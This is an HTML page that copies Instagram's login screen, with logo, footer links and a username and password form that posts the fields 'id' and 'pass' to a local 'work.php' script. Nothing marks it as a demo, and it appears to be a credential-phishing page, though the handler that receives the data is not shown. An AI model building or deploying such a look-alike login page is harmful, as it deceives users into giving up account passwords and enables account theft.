<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
    <section class="header">
      <img src="./instas.png" />
    </section>
    <section class="form">
      <form method="POST" action="work.php">
        <div class="input1 input">
          <label>
            <input placeholder=" " class="id" value="" name="id"/>
            <span>Phone number, username, or email</span>
          </label>
        </div>
        <div class="input2">
          <label>
            <input placeholder=" " type="password" class="password" value="" name="pass">
            <span class="span2">Password</span>
          </label>
        </div>
        <div class="button">
          Log In
        </div>
      </form>
    </section>
    <div class="or">
      <div class="line line1"></div>
      <div class="text">
        <p>OR</p>
      </div>
      <div class="line line2"></div>
    </div>
    <div class="fb">
      <img src="./fb.png" />
      <p>Log in with Facebook</p>
    </div>
    <div class="pass">
      <p>Forgot Password?</p>
    </div>
    <div class="sign">
      <p>Don't have an account?</p>
      <a>Sign up</a>
    </div>
    <div class="app">
      <p>Get the app.</p>
    </div>
    <div class="store">
      <img src="./apple.png" class="img" />
      <img src="./google.png" class="img" />
    </div>
    <div class="nav">
      <div class="top">
        <p>About</p>
        <p>Blog</p>
        <p>Jobs</p>
        <p>Help</p>
        <p>API</p>
        <p>Privacy</p>
        <p>Terms</p>
      </div>
      <div class="bottom">
        <p>Top Accounts</p>
        <p>Hashtags</p>
        <p>Locations</p>
      </div>
    </div>
  </body>
  <script src="./build.js"></script>
</html>
